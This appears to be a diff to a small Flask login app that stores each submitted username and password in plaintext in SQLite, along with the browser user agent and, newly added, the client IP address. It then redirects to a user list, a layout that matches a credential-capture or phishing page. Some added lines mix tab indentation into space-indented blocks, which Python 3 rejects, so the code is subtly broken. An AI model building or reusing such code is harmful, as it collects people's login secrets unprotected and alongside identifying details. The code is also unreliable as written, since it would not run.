@@ -8,6 +8,7 @@ Autor: alexfrancow
 #################
 
 from flask import Flask, Blueprint, render_template, request, redirect
+from flask import jsonify
 import sqlite3 as sql
 import datetime
 import httpagentparser
@@ -31,20 +32,21 @@ app = Flask(__name__)
 #### functions ####
 ###################
 
-def insert_readings(user, passwd, time, UA):
+def insert_readings(user, passwd, time, UA, remote_IP):
     DATABASE = 'test.db'
     with sql.connect(DATABASE) as con:
         cur = con.cursor()
         #cur.execute("CREATE TABLE users (user TEXT, passwd TEXT, time DATETIME)")
         #cur.execute("alter table users add column time DATETIME")
         #cur.execute("alter table users add column UA TEXT")
-        cur.execute("INSERT INTO users (user, passwd, time, UA) VALUES (?,?,?,?)", (user, passwd, time, UA))
+	#cur.execute("alter table users add column remote_IP TEXT")
+        cur.execute("INSERT INTO users (user, passwd, time, UA, remote_IP) VALUES (?,?,?,?,?)", (user, passwd, time, UA, remote_IP))
         con.commit()
 
 ################
 #### routes ####
 ################
-        
+
 @login_blueprint.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
@@ -55,9 +57,10 @@ def login():
         UA = request.headers.get('User-Agent')
         UA = httpagentparser.simple_detect(UA)
         UA = ' '.join(UA)
+	remote_IP = request.remote_addr
         print (UA)
-        insert_readings(user, passwd, time, UA)
-
+        insert_readings(user, passwd, time, UA, remote_IP)
+	print(remote_IP)
         return redirect("/users")
 
     return render_template('index2.html')
